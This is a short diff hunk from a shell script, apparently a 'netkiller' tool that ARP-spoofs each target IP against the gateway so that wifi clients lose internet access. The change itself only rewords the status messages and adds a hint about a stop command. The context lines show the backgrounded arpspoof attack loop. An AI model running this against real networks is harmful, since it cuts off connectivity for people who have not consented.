@@ -41,4 +41,6 @@ for TARGET in $TARGET_IPS; do
         arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
     ) &
 done
-echo "Attack is running...!!!"
+
+echo "Attacks are running in the background...!!!"
+echo "Type: netkiller-stop to restore the wifi clients internet connection..."
